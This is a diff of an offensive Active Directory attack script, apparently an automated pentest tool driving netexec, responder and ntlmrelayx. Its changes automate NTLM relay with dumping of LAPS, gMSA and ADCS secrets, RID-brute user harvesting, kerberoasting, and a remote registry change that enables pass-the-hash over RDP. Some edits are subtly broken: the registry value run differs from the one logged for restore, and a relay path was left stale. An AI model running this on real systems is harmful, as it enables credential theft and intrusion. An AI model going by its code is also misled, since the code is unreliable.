@@ -33,9 +33,9 @@ starter() {
 	done
 
 	if [ -n "$Password" ]; then
-		cme_creds="-p $Password"
+		cme_creds="-p ${Password}"
 	else
-		cme_creds="-H $NT_Hash"
+		cme_creds="-H ${NT_Hash}"
 	fi
 	
 	# Paths
@@ -155,7 +155,7 @@ check_live_hosts() {
 	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
 	# Calculer l'adresse réseau pour arp discovery
 	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Network:" | awk '{print $2}')
-	NETWORK_LAN_BROADCAST=$(echo "$network_info" | grep "Broadcast:" | awk '{print $2}')
+	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
 	
 	TARGET_LAN=$(ipcalc -n -b $rangeIP  | grep "Network:" | awk '{print $2}')
 	TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP | grep "Broadcast:" | awk '{print $2}')
@@ -173,10 +173,10 @@ check_live_hosts() {
 	target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")
 	
 	#If attack range is into the selected network interface
-	if [[ $network_start -ge $supernet_start && $network_end -le $supernet_end ]]; then
+	if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
 		nmap -PR -sn $rangeIP | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v $MY_IP > $DIR/tmp_hosts.txt 2>&1
 		#S'assurer que les excluded hosts ne sont pas inclu dans hosts.txt
-		cat $DIR/tmp_hosts.txt | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' > $DIR/hosts.txt
+		grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $DIR/tmp_hosts.txt > $DIR/hosts.txt
 		rm $DIR/tmp_hosts.txt
 		NMAP_HOSTS="-iL $DIR/hosts.txt"
 		log "[!] Alive targets file created : $DIR/hosts.txt"
@@ -353,11 +353,11 @@ nmap_fast () {
 relay () {
 	log "[🔍] Getting hosts with Relayable SMB"
 	mkdir $DIR_VULNS/NTLM_relay
-	$proxychains netexec --timeout $CME_TIMEOUT smb ${DIR}/hosts.txt --gen-relay-list $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
+	$proxychains netexec --timeout $CME_TIMEOUT smb ${DIR}/hosts.txt --gen-relay-list $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt < /dev/null > /dev/null 2>&1
 	sort -u $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -o $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
-	if [ -f "$DIR_VULNS/ntlm-relay-list.txt" ];then
+	if [ -f "$DIR_VULNS/NTLM_relay/ntlm-relay-list.txt" ];then
 		nb_relay_vulnerable=$(cat $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt | wc -l)
-		green_log "${SPACE}[💀] NTLM Relayable list ($nb_relay_vulnerable) for $rangeIP was logged successfully in $DIR_VULNS/ntlm-relay-list.txt"
+		green_log "${SPACE}[💀] Found $nb_relay_vulnerable devices vulnerable to NTLM relay in the $rangeIP network -> $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt"
 		#If prochains isn't enabled then try to catch something with responder and ntlmrelay
 		if [ -z "$proxychains" ];then
 			#Turn off all settings before "Custom challenge" on responder config file
@@ -382,11 +382,14 @@ relay () {
 				sleep 1
 				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
+			green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
+		else
+			blue_log "${SPACE} [!] Impossible to launch NTLM Relay via proxychains"
 		fi
-		green_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
+		
 	else
 		rm $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt
-		red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
+		#red_log "${SPACE}[X] No NTLM relay possible for this range $rangeIP"
 	fi
 }
 
@@ -538,7 +541,7 @@ winrm () {
 	if { [ -e "$DIR_PORTS/5985.txt" ] || [ -e "$DIR_PORTS/5986.txt" ] || [ -e "$DIR_PORTS/47001.txt" ]; } && [ "$Username" != "anonymous" ]; then
 		log "[🔍] Check WINRM"
 		for fichier in $DIR_PORTS/5985.txt $DIR_PORTS/5986.txt $DIR_PORTS/47001.txt; do
-			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/winrm.txt" || echo "Le fichier $fichier est absent."
+			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/winrm.txt"
 		done
 		sort -u ${DIR_PORTS}/winrm.txt -o ${DIR_PORTS}/winrm.txt
 		WINRM=$(cat $DIR_PORTS/winrm.txt)
@@ -684,13 +687,13 @@ vnc () {
 	if [[ -e "$DIR_PORTS/5800.txt" ]] || [[ -e "$DIR_PORTS/5801.txt" ]] || [[ -e "$DIR_PORTS/5900.txt" ]] || [[ -e "$DIR_PORTS/5901.txt" ]]; then
 		log "[🔍] Check NFS"
 		for fichier in $DIR_PORTS/5800.txt $DIR_PORTS/5801.txt $DIR_PORTS/5900.txt $DIR_PORTS/5901.txt; do
-			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/vnc.txt" || echo "Le fichier $fichier est absent."
+			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/vnc.txt"
 		done
 		#assemblage et suppression des doublons des clients
 		sort -u ${DIR_PORTS}/vnc.txt -o ${DIR_PORTS}/vnc.txt
 		
 		green_log "${SPACE}[!] VNC opened on machines (check manually for credentials into default file) -> ${DIR_PORTS}/vnc.txt"
-		VNC=$(cat ${DIR_PORTS}/vnc.txt)
+		VNC=$(cat ${DIR_PORTS}/vnc.txt 2>/dev/null)
 	fi
 }
 
@@ -739,7 +742,7 @@ snmp () {
 		log "[??] Check devices using SNMP protocol on public community"
 		#merge of files
 		for fichier in $DIR_PORTS/161.txt $DIR_PORTS/162.txt $DIR_PORTS/1061.txt $DIR_PORTS/1062.txt; do
-			cat "$fichier" /dev/null 2>&1 >> "$DIR_PORTS/snmp.txt" || echo "Le fichier $fichier est absent."
+			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/snmp.txt"
 		done
   		sort -u "$DIR_PORTS/snmp.txt" -o "$DIR_PORTS/snmp.txt"
   
@@ -770,7 +773,7 @@ ldap () {
 		mkdir ${DIR_VULNS}/ldap
 		log "[🔍] Anonymous LDAP check"
 		#Extract the IPs of machines with port 389 open
-		ip=$(cat "${DIR_PORTS}/389.txt")
+		ip=$(cat "${DIR_PORTS}/389.txt" 2>/dev/null)
 		#extraction of the FQDN and IP names of machines with port 389 open
 		grep -E $ip ${DIR}/hostname_file.txt > ${DIR}/IP_FQDN_ldap.txt
 		#Extraction of one line (ip + hostname) from the LDAP server (AD) for each domain/sub-domain. The aim is not to carry out the attack on 3 DCs in the same domain
@@ -822,7 +825,7 @@ ldap () {
 	fi
 
 	### ENUMERATION LDAP ###
-	LDAP_Servers=$(cat $DIR/ports/88.txt $DIR/ports/389.txt | sort | uniq)
+	LDAP_Servers=$(cat $DIR/ports/88.txt $DIR/ports/389.txt 2>/dev/null | sort | uniq)
 	ldap_modules=(adcs laps get-userPassword get-unixUserPassword)
 	if [[ -n "$LDAP_Servers" ]] && [[ "$Username" != "anonymous" ]]; then
 		log "[🔍] Enumeration via LDAP"
@@ -936,7 +939,13 @@ smb () {
 			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest; then
 				green_log "${SPACE}${SPACE}[💀] Guest session allowed"
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
+				
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
 				
 				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
@@ -1023,7 +1032,8 @@ smb () {
 				###### RETRIEVE USERS ######
 					#'< /dev/null' avoid netexec to break the loop, weird behavior ..
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip $cme_creds $kerberos --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser' |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
 				if grep -qs "SidTypeUser" "$check_smb"; then
 					green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
@@ -1162,7 +1172,7 @@ smb () {
 							red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
 							rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
 						else
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
+							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
 							orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
 							echo -e "\nACTION :" >> $DIR/modifs.txt
 							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
@@ -1291,7 +1301,7 @@ krb () {
 			fi
 		fi
 
-		if { ! grep -q 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [[ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]] ; } || grep -q 'krb5tgs' "$DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt"; then
+		if { ! grep -qs 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [[ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]] ; } || grep -qs 'krb5tgs' "$DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt"; then
 			green_log "${SPACE}[💀] Great, kerberoastable accounts found -> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt"
 			blue_log "${SPACE} [+] Use hashcat -m 13100 ... to bang them passwords"
 		fi
@@ -1304,7 +1314,7 @@ krb () {
 			unset KRB5CCNAME
 			rm ${Username}.ccache
 		fi
-		if cat "$DIR_VULNS/krb/Delegations.txt" | grep -q 'AccountName';then
+		if grep -qs 'AccountName' $DIR_VULNS/krb/Delegations.txt;then
 			echo $delegation_request >> $DIR_VULNS/Vulns_delegation.txt;
 			green_log "[💀] Delegations found -> $DIR_VULNS/krb/Delegations.txt"
 		fi
@@ -1457,7 +1467,7 @@ fi
 
 # Restore modifications
 if [[ $restore ]]; then
-    commands=$(cat $DIR/modifs.txt)
+	DIR=$ProjectName
     while IFS= read -r command; do
         eval $command
     done < "$DIR/modifs_automation.txt"
